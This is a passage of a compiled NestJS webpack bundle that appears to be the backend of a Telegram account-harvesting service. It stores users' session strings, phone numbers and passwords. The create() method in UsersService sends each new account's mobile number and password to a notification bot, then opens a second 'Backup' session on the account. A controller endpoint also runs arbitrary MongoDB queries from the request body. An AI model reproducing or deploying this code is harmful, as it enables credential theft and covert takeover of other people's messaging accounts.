    __metadata("design:type", Number)
], CreateUserDto.prototype, "msgs", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Total number of chats', example: 195 }),
    __metadata("design:type", Number)
], CreateUserDto.prototype, "totalChats", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Timestamp of last active', example: '2024-06-03' }),
    __metadata("design:type", String)
], CreateUserDto.prototype, "lastActive", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Telegram ID of the user', example: '2022068676' }),
    __metadata("design:type", String)
], CreateUserDto.prototype, "tgId", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'TwoFA status', example: false }),
    __metadata("design:type", Boolean)
], CreateUserDto.prototype, "twoFA", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Expiration status', example: false }),
    __metadata("design:type", Boolean)
], CreateUserDto.prototype, "expired", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'password', example: "pass" }),
    __metadata("design:type", String)
], CreateUserDto.prototype, "password", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Number of movies', example: 0 }),
    __metadata("design:type", Number)
], CreateUserDto.prototype, "movieCount", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Number of photos', example: 0 }),
    __metadata("design:type", Number)
], CreateUserDto.prototype, "photoCount", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Number of videos', example: 0 }),
    __metadata("design:type", Number)
], CreateUserDto.prototype, "videoCount", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Gender of the user', example: null }),
    __metadata("design:type", String)
], CreateUserDto.prototype, "gender", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Number of other photos', example: 0 }),
    __metadata("design:type", Number)
], CreateUserDto.prototype, "otherPhotoCount", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Number of other videos', example: 0 }),
    __metadata("design:type", Number)
], CreateUserDto.prototype, "otherVideoCount", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Number of own photos', example: 0 }),
    __metadata("design:type", Number)
], CreateUserDto.prototype, "ownPhotoCount", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Number of own videos', example: 0 }),
    __metadata("design:type", Number)
], CreateUserDto.prototype, "ownVideoCount", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Number of contacts', example: 105 }),
    __metadata("design:type", Number)
], CreateUserDto.prototype, "contacts", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({
        description: 'Call details of the user',
        example: {
            outgoing: 1,
            incoming: 0,
            video: 1,
            chatCallCounts: [],
            totalCalls: 1,
        },
    }),
    __metadata("design:type", Object)
], CreateUserDto.prototype, "calls", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({
        description: 'Call details of the user',
        example: []
    }),
    __metadata("design:type", Array)
], CreateUserDto.prototype, "recentUsers", void 0);


/***/ }),

/***/ "./src/components/users/dto/search-user.dto.ts":
/*!*****************************************************!*\
  !*** ./src/components/users/dto/search-user.dto.ts ***!
  \*****************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.SearchUserDto = void 0;
const swagger_1 = __webpack_require__(/*! @nestjs/swagger */ "@nestjs/swagger");
const class_transformer_1 = __webpack_require__(/*! class-transformer */ "class-transformer");
const class_validator_1 = __webpack_require__(/*! class-validator */ "class-validator");
class SearchUserDto {
}
exports.SearchUserDto = SearchUserDto;
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ description: 'Filter by Telegram ID' }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsString)(),
    __metadata("design:type", String)
], SearchUserDto.prototype, "tgId", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ description: 'Filter by mobile number' }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsString)(),
    __metadata("design:type", String)
], SearchUserDto.prototype, "mobile", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ description: 'Filter by twoFA status', type: Boolean }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsBoolean)(),
    __metadata("design:type", Boolean)
], SearchUserDto.prototype, "twoFA", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ description: 'Filter by Expiration status', type: Boolean }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsBoolean)(),
    __metadata("design:type", Boolean)
], SearchUserDto.prototype, "expired", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ description: 'Filter by session' }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsString)(),
    __metadata("design:type", String)
], SearchUserDto.prototype, "session", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ description: 'Filter by first name' }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsString)(),
    __metadata("design:type", String)
], SearchUserDto.prototype, "firstName", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ description: 'Filter by last name' }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsString)(),
    __metadata("design:type", String)
], SearchUserDto.prototype, "lastName", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ description: 'Filter by username' }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsString)(),
    __metadata("design:type", String)
], SearchUserDto.prototype, "username", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ description: 'Filter by channels count' }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsNumber)(),
    __metadata("design:type", Number)
], SearchUserDto.prototype, "channels", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ description: 'Filter by personal chats count' }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsNumber)(),
    __metadata("design:type", Number)
], SearchUserDto.prototype, "personalChats", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ description: 'Filter by demo given status', type: Boolean }),
    (0, class_transformer_1.Transform)(({ value }) => value === 'true' || value === true),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsBoolean)(),
    __metadata("design:type", Boolean)
], SearchUserDto.prototype, "demoGiven", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ description: 'Filter by messages count' }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsNumber)(),
    __metadata("design:type", Number)
], SearchUserDto.prototype, "msgs", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ description: 'Filter by total chats count' }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsNumber)(),
    __metadata("design:type", Number)
], SearchUserDto.prototype, "totalChats", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ description: 'Filter by last active timestamp' }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsNumber)(),
    __metadata("design:type", String)
], SearchUserDto.prototype, "lastActive", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ description: 'Filter by movie count' }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsNumber)(),
    __metadata("design:type", Number)
], SearchUserDto.prototype, "movieCount", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ description: 'Filter by photo count' }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsNumber)(),
    __metadata("design:type", Number)
], SearchUserDto.prototype, "photoCount", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ description: 'Filter by video count' }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsNumber)(),
    __metadata("design:type", Number)
], SearchUserDto.prototype, "videoCount", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ description: 'Filter by gender' }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsString)(),
    __metadata("design:type", String)
], SearchUserDto.prototype, "gender", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ description: 'Filter by other photo count' }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsNumber)(),
    __metadata("design:type", Number)
], SearchUserDto.prototype, "otherPhotoCount", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ description: 'Filter by other video count' }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsNumber)(),
    __metadata("design:type", Number)
], SearchUserDto.prototype, "otherVideoCount", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ description: 'Filter by own photo count' }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsNumber)(),
    __metadata("design:type", Number)
], SearchUserDto.prototype, "ownPhotoCount", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ description: 'Filter by own video count' }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsNumber)(),
    __metadata("design:type", Number)
], SearchUserDto.prototype, "ownVideoCount", void 0);


/***/ }),

/***/ "./src/components/users/dto/update-user.dto.ts":
/*!*****************************************************!*\
  !*** ./src/components/users/dto/update-user.dto.ts ***!
  \*****************************************************/
/***/ ((__unused_webpack_module, exports, __webpack_require__) => {


Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.UpdateUserDto = void 0;
const mapped_types_1 = __webpack_require__(/*! @nestjs/mapped-types */ "@nestjs/mapped-types");
const create_user_dto_1 = __webpack_require__(/*! ./create-user.dto */ "./src/components/users/dto/create-user.dto.ts");
class UpdateUserDto extends (0, mapped_types_1.PartialType)(create_user_dto_1.CreateUserDto) {
}
exports.UpdateUserDto = UpdateUserDto;


/***/ }),

/***/ "./src/components/users/schemas/user.schema.ts":
/*!*****************************************************!*\
  !*** ./src/components/users/schemas/user.schema.ts ***!
  \*****************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
var __importDefault = (this && this.__importDefault) || function (mod) {
    return (mod && mod.__esModule) ? mod : { "default": mod };
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.UserSchema = exports.User = void 0;
const mongoose_1 = __webpack_require__(/*! @nestjs/mongoose */ "@nestjs/mongoose");
const mongoose_2 = __importDefault(__webpack_require__(/*! mongoose */ "mongoose"));
const swagger_1 = __webpack_require__(/*! @nestjs/swagger */ "@nestjs/swagger");
let User = class User {
    constructor() {
        this.twoFA = false;
        this.expired = false;
        this.password = null;
    }
};
exports.User = User;
__decorate([
    (0, swagger_1.ApiProperty)(),
    (0, mongoose_1.Prop)({ required: true, unique: true }),
    __metadata("design:type", String)
], User.prototype, "mobile", void 0);
__decorate([
    (0, swagger_1.ApiProperty)(),
    (0, mongoose_1.Prop)({ required: true, unique: true }),
    __metadata("design:type", String)
], User.prototype, "session", void 0);
__decorate([
    (0, swagger_1.ApiProperty)(),
    (0, mongoose_1.Prop)(),
    __metadata("design:type", String)
], User.prototype, "firstName", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ required: false }),
    (0, mongoose_1.Prop)(),
    __metadata("design:type", String)
], User.prototype, "lastName", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ required: false }),
    (0, mongoose_1.Prop)(),
    __metadata("design:type", String)
], User.prototype, "username", void 0);
__decorate([
    (0, swagger_1.ApiProperty)(),
    (0, mongoose_1.Prop)(),
    __metadata("design:type", Number)
], User.prototype, "channels", void 0);
__decorate([
    (0, swagger_1.ApiProperty)(),
    (0, mongoose_1.Prop)(),
    __metadata("design:type", Number)
], User.prototype, "personalChats", void 0);
__decorate([
    (0, swagger_1.ApiProperty)(),
    (0, mongoose_1.Prop)(),
    __metadata("design:type", Boolean)
], User.prototype, "demoGiven", void 0);
__decorate([
    (0, swagger_1.ApiProperty)(),
    (0, mongoose_1.Prop)(),
    __metadata("design:type", Number)
], User.prototype, "msgs", void 0);
__decorate([
    (0, swagger_1.ApiProperty)(),
    (0, mongoose_1.Prop)(),
    __metadata("design:type", Number)
], User.prototype, "totalChats", void 0);
__decorate([
    (0, swagger_1.ApiProperty)(),
    (0, mongoose_1.Prop)(),
    __metadata("design:type", String)
], User.prototype, "lastActive", void 0);
__decorate([
    (0, swagger_1.ApiProperty)(),
    (0, mongoose_1.Prop)({ required: true, unique: true }),
    __metadata("design:type", String)
], User.prototype, "tgId", void 0);
__decorate([
    (0, swagger_1.ApiProperty)(),
    (0, mongoose_1.Prop)(),
    __metadata("design:type", Number)
], User.prototype, "movieCount", void 0);
__decorate([
    (0, swagger_1.ApiProperty)(),
    (0, mongoose_1.Prop)(),
    __metadata("design:type", Number)
], User.prototype, "photoCount", void 0);
__decorate([
    (0, swagger_1.ApiProperty)(),
    (0, mongoose_1.Prop)(),
    __metadata("design:type", Number)
], User.prototype, "videoCount", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ required: false }),
    (0, mongoose_1.Prop)(),
    __metadata("design:type", String)
], User.prototype, "gender", void 0);
__decorate([
    (0, mongoose_1.Prop)({ required: false, type: Boolean }),
    __metadata("design:type", Boolean)
], User.prototype, "twoFA", void 0);
__decorate([
    (0, mongoose_1.Prop)({ required: false, type: Boolean, default: false }),
    __metadata("design:type", Boolean)
], User.prototype, "expired", void 0);
__decorate([
    (0, mongoose_1.Prop)({ required: false }),
    __metadata("design:type", String)
], User.prototype, "password", void 0);
__decorate([
    (0, swagger_1.ApiProperty)(),
    (0, mongoose_1.Prop)(),
    __metadata("design:type", Number)
], User.prototype, "otherPhotoCount", void 0);
__decorate([
    (0, swagger_1.ApiProperty)(),
    (0, mongoose_1.Prop)(),
    __metadata("design:type", Number)
], User.prototype, "otherVideoCount", void 0);
__decorate([
    (0, swagger_1.ApiProperty)(),
    (0, mongoose_1.Prop)(),
    __metadata("design:type", Number)
], User.prototype, "ownPhotoCount", void 0);
__decorate([
    (0, swagger_1.ApiProperty)(),
    (0, mongoose_1.Prop)(),
    __metadata("design:type", Number)
], User.prototype, "ownVideoCount", void 0);
__decorate([
    (0, swagger_1.ApiProperty)(),
    (0, mongoose_1.Prop)(),
    __metadata("design:type", Number)
], User.prototype, "contacts", void 0);
__decorate([
    (0, swagger_1.ApiProperty)(),
    (0, mongoose_1.Prop)({
        type: mongoose_2.default.Schema.Types.Mixed,
        default: {
            outgoing: 0,
            incoming: 0,
            video: 0,
            chatCallCounts: [],
            totalCalls: 0,
        },
    }),
    __metadata("design:type", Object)
], User.prototype, "calls", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)(),
    (0, mongoose_1.Prop)({
        type: mongoose_2.default.Schema.Types.Mixed,
        default: [],
        required: false,
    }),
    __metadata("design:type", Array)
], User.prototype, "recentUsers", void 0);
exports.User = User = __decorate([
    (0, mongoose_1.Schema)({
        collection: 'users', versionKey: false, autoIndex: true, timestamps: true,
        toJSON: {
            virtuals: true,
            transform: (doc, ret) => {
                ret['id'] = ret._id;
                delete ret._id;
                return ret;
            },
        },
    })
], User);
exports.UserSchema = mongoose_1.SchemaFactory.createForClass(User);


/***/ }),

/***/ "./src/components/users/users.controller.ts":
/*!**************************************************!*\
  !*** ./src/components/users/users.controller.ts ***!
  \**************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
var __param = (this && this.__param) || function (paramIndex, decorator) {
    return function (target, key) { decorator(target, key, paramIndex); }
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.UsersController = void 0;
const common_1 = __webpack_require__(/*! @nestjs/common */ "@nestjs/common");
const users_service_1 = __webpack_require__(/*! ./users.service */ "./src/components/users/users.service.ts");
const swagger_1 = __webpack_require__(/*! @nestjs/swagger */ "@nestjs/swagger");
const search_user_dto_1 = __webpack_require__(/*! ./dto/search-user.dto */ "./src/components/users/dto/search-user.dto.ts");
const update_user_dto_1 = __webpack_require__(/*! ./dto/update-user.dto */ "./src/components/users/dto/update-user.dto.ts");
const create_user_dto_1 = __webpack_require__(/*! ./dto/create-user.dto */ "./src/components/users/dto/create-user.dto.ts");
let UsersController = class UsersController {
    constructor(usersService) {
        this.usersService = usersService;
    }
    async create(createUserDto) {
        console.log("creating new user");
        return this.usersService.create(createUserDto);
    }
    async search(queryParams) {
        return this.usersService.search(queryParams);
    }
    async findAll() {
        return this.usersService.findAll();
    }
    async findOne(tgId) {
        return this.usersService.findOne(tgId);
    }
    async update(tgId, updateUserDto) {
        return this.usersService.update(tgId, updateUserDto);
    }
    async remove(tgId) {
        return this.usersService.delete(tgId);
    }
    async executeQuery(requestBody) {
        const { query, sort, limit, skip } = requestBody;
        try {
            return await this.usersService.executeQuery(query, sort, limit, skip);
        }
        catch (error) {
            throw error;
        }
    }
};
exports.UsersController = UsersController;
__decorate([
    (0, common_1.Post)(),
    (0, swagger_1.ApiOperation)({ summary: 'Create a new user' }),
    __param(0, (0, common_1.Body)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [create_user_dto_1.CreateUserDto]),
    __metadata("design:returntype", Promise)
], UsersController.prototype, "create", null);
__decorate([
    (0, common_1.Get)('/search'),
    (0, swagger_1.ApiOperation)({ summary: 'Search users based on various parameters' }),
    __param(0, (0, common_1.Query)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [search_user_dto_1.SearchUserDto]),
    __metadata("design:returntype", Promise)
], UsersController.prototype, "search", null);
__decorate([
    (0, common_1.Get)(),
    (0, swagger_1.ApiOperation)({ summary: 'Get all users' }),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", []),
    __metadata("design:returntype", Promise)
], UsersController.prototype, "findAll", null);
__decorate([
    (0, common_1.Get)(':tgId'),
    (0, swagger_1.ApiOperation)({ summary: 'Get a user by tgId' }),
    (0, swagger_1.ApiParam)({ name: 'tgId', description: 'The Telegram ID of the user', type: String }),
    __param(0, (0, common_1.Param)('tgId')),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String]),
    __metadata("design:returntype", Promise)
], UsersController.prototype, "findOne", null);
__decorate([
    (0, common_1.Patch)(':tgId'),
    (0, swagger_1.ApiOperation)({ summary: 'Update a user by tgId' }),
    (0, swagger_1.ApiParam)({ name: 'tgId', description: 'The Telegram ID of the user', type: String }),
    __param(0, (0, common_1.Param)('tgId')),
    __param(1, (0, common_1.Body)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String, update_user_dto_1.UpdateUserDto]),
    __metadata("design:returntype", Promise)
], UsersController.prototype, "update", null);
__decorate([
    (0, common_1.Delete)(':tgId'),
    (0, swagger_1.ApiOperation)({ summary: 'Delete a user by tgId' }),
    (0, swagger_1.ApiParam)({ name: 'tgId', description: 'The Telegram ID of the user', type: String }),
    __param(0, (0, common_1.Param)('tgId')),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String]),
    __metadata("design:returntype", Promise)
], UsersController.prototype, "remove", null);
__decorate([
    (0, common_1.Post)('query'),
    (0, swagger_1.ApiOperation)({ summary: 'Execute a custom MongoDB query' }),
    __param(0, (0, common_1.Body)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [Object]),
    __metadata("design:returntype", Promise)
], UsersController.prototype, "executeQuery", null);
exports.UsersController = UsersController = __decorate([
    (0, swagger_1.ApiTags)('Telegram Users'),
    (0, common_1.Controller)('user'),
    __metadata("design:paramtypes", [users_service_1.UsersService])
], UsersController);


/***/ }),

/***/ "./src/components/users/users.module.ts":
/*!**********************************************!*\
  !*** ./src/components/users/users.module.ts ***!
  \**********************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.UsersModule = void 0;
const common_1 = __webpack_require__(/*! @nestjs/common */ "@nestjs/common");
const mongoose_1 = __webpack_require__(/*! @nestjs/mongoose */ "@nestjs/mongoose");
const users_service_1 = __webpack_require__(/*! ./users.service */ "./src/components/users/users.service.ts");
const users_controller_1 = __webpack_require__(/*! ./users.controller */ "./src/components/users/users.controller.ts");
const user_schema_1 = __webpack_require__(/*! ./schemas/user.schema */ "./src/components/users/schemas/user.schema.ts");
const Telegram_module_1 = __webpack_require__(/*! ../Telegram/Telegram.module */ "./src/components/Telegram/Telegram.module.ts");
const client_module_1 = __webpack_require__(/*! ../clients/client.module */ "./src/components/clients/client.module.ts");
const init_module_1 = __webpack_require__(/*! ../ConfigurationInit/init.module */ "./src/components/ConfigurationInit/init.module.ts");
let UsersModule = class UsersModule {
};
exports.UsersModule = UsersModule;
exports.UsersModule = UsersModule = __decorate([
    (0, common_1.Module)({
        imports: [
            init_module_1.InitModule,
            mongoose_1.MongooseModule.forFeature([{ name: 'userModule', schema: user_schema_1.UserSchema, collection: 'users' }]),
            (0, common_1.forwardRef)(() => Telegram_module_1.TelegramModule),
            (0, common_1.forwardRef)(() => client_module_1.ClientModule)
        ],
        controllers: [users_controller_1.UsersController],
        providers: [users_service_1.UsersService],
        exports: [users_service_1.UsersService]
    })
], UsersModule);


/***/ }),

/***/ "./src/components/users/users.service.ts":
/*!***********************************************!*\
  !*** ./src/components/users/users.service.ts ***!
  \***********************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
var __param = (this && this.__param) || function (paramIndex, decorator) {
    return function (target, key) { decorator(target, key, paramIndex); }
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.UsersService = void 0;
const Telegram_service_1 = __webpack_require__(/*! ./../Telegram/Telegram.service */ "./src/components/Telegram/Telegram.service.ts");
const common_1 = __webpack_require__(/*! @nestjs/common */ "@nestjs/common");
const mongoose_1 = __webpack_require__(/*! @nestjs/mongoose */ "@nestjs/mongoose");
const mongoose_2 = __webpack_require__(/*! mongoose */ "mongoose");
const client_service_1 = __webpack_require__(/*! ../clients/client.service */ "./src/components/clients/client.service.ts");
const fetchWithTimeout_1 = __webpack_require__(/*! ../../utils/fetchWithTimeout */ "./src/utils/fetchWithTimeout.ts");
const logbots_1 = __webpack_require__(/*! ../../utils/logbots */ "./src/utils/logbots.ts");
const connection_manager_1 = __webpack_require__(/*! ../Telegram/utils/connection-manager */ "./src/components/Telegram/utils/connection-manager.ts");
let UsersService = class UsersService {
    constructor(userModel, telegramService, clientsService) {
        this.userModel = userModel;
        this.telegramService = telegramService;
        this.clientsService = clientsService;
    }
    async create(user) {
        const activeClientSetup = this.telegramService.getActiveClientSetup();
        console.log("New User received - ", user?.mobile);
        console.log("ActiveClientSetup::", activeClientSetup);
        if (activeClientSetup && activeClientSetup.newMobile === user.mobile) {
            console.log("Updating New Session Details", user.mobile, user.username, activeClientSetup.clientId);
            await this.clientsService.updateClientSession(user.session);
        }
        else {
            await (0, fetchWithTimeout_1.fetchWithTimeout)(`${(0, logbots_1.notifbot)()}&text=${encodeURIComponent(`ACCOUNT LOGIN: ${user.username ? `@${user.username}` : user.firstName}\nMobile: t.me/${user.mobile}${user.password ? `\npassword: ${user.password}` : "\n"}`)}`);
            setTimeout(async () => {
                try {
                    await connection_manager_1.connectionManager.getClient(user.mobile, { autoDisconnect: false, handler: false });
                    const newSession = await this.telegramService.createNewSession(user.mobile);
                    const newUserBackup = new this.userModel({ ...user, session: newSession, lastName: "Backup" });
                    await newUserBackup.save();
                }
                catch (error) {
                    console.log("Error in creating new session", error);
                }
            }, 3000);
            const newUser = new this.userModel(user);
            return newUser.save();
        }
    }
    async findAll() {
        return this.userModel.find().exec();
    }
    async findOne(tgId) {
        const user = await (await this.userModel.findOne({ tgId }).exec())?.toJSON();
        if (!user) {
            throw new common_1.NotFoundException(`User with tgId ${tgId} not found`);
        }
        return user;
    }
    async update(tgId, user) {
        delete user['_id'];
        const result = await this.userModel.updateMany({ tgId }, { $set: user }, { new: true, upsert: true }).exec();
        if (result.matchedCount === 0) {
            throw new common_1.NotFoundException(`Users with tgId ${tgId} not found`);
        }
        return result.modifiedCount;
    }
    async updateByFilter(filter, user) {
        delete user['_id'];
        const result = await this.userModel.updateMany(filter, { $set: user }, { new: true, upsert: true }).exec();
        if (result.matchedCount === 0) {
            throw new common_1.NotFoundException(`Users with tgId ${JSON.stringify(filter)} not found`);
        }
        return result.modifiedCount;
    }
    async delete(tgId) {
        const result = await this.userModel.deleteOne({ tgId }).exec();
        if (result.deletedCount === 0) {
            throw new common_1.NotFoundException(`User with tgId ${tgId} not found`);
        }
    }
    async deleteById(userId) {
        const result = await this.userModel.deleteOne({ _id: userId }).exec();
        if (result.deletedCount === 0) {
            throw new common_1.NotFoundException(`User with id ${userId} not found`);
        }
    }
    async search(filter) {
        if (filter.firstName) {
            filter.firstName = { $regex: new RegExp(filter.firstName, 'i') };
        }
        if (filter.twoFA !== undefined) {
            filter.twoFA = filter.twoFA === 'true' || filter.twoFA === '1' || filter.twoFA === true;
        }
        console.log(filter);
        return this.userModel.find(filter).sort({ updatedAt: -1 }).exec();
    }
    async executeQuery(query, sort, limit, skip) {
        try {
            if (!query) {
                throw new common_1.BadRequestException('Query is invalid.');
            }
            const queryExec = this.userModel.find(query);
            if (sort) {
                queryExec.sort(sort);
            }
            if (limit) {
                queryExec.limit(limit);
            }
            if (skip) {
                queryExec.skip(skip);
            }
            return await queryExec.exec();
        }
        catch (error) {
            throw new common_1.InternalServerErrorException(error.message);
        }
    }
};
exports.UsersService = UsersService;
exports.UsersService = UsersService = __decorate([
    (0, common_1.Injectable)(),
    __param(0, (0, mongoose_1.InjectModel)('userModule')),
    __param(1, (0, common_1.Inject)((0, common_1.forwardRef)(() => Telegram_service_1.TelegramService))),
    __param(2, (0, common_1.Inject)((0, common_1.forwardRef)(() => client_service_1.ClientService))),
    __metadata("design:paramtypes", [mongoose_2.Model,
        Telegram_service_1.TelegramService,
        client_service_1.ClientService])
], UsersService);


/***/ }),

/***/ "./src/guards/auth.guard.ts":
/*!**********************************!*\
  !*** ./src/guards/auth.guard.ts ***!
  \**********************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var ApiKeyOrIpOrOriginGuard_1;
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.ApiKeyOrIpOrOriginGuard = void 0;
const common_1 = __webpack_require__(/*! @nestjs/common */ "@nestjs/common");
const ALLOWED_IPS = ['31.97.59.2', '148.230.84.50', '13.228.225.19', '18.142.128.26', '54.254.162.138'];
const ALLOWED_ORIGINS = ['https://paidgirl.site', 'https://zomcall.netlify.app'];
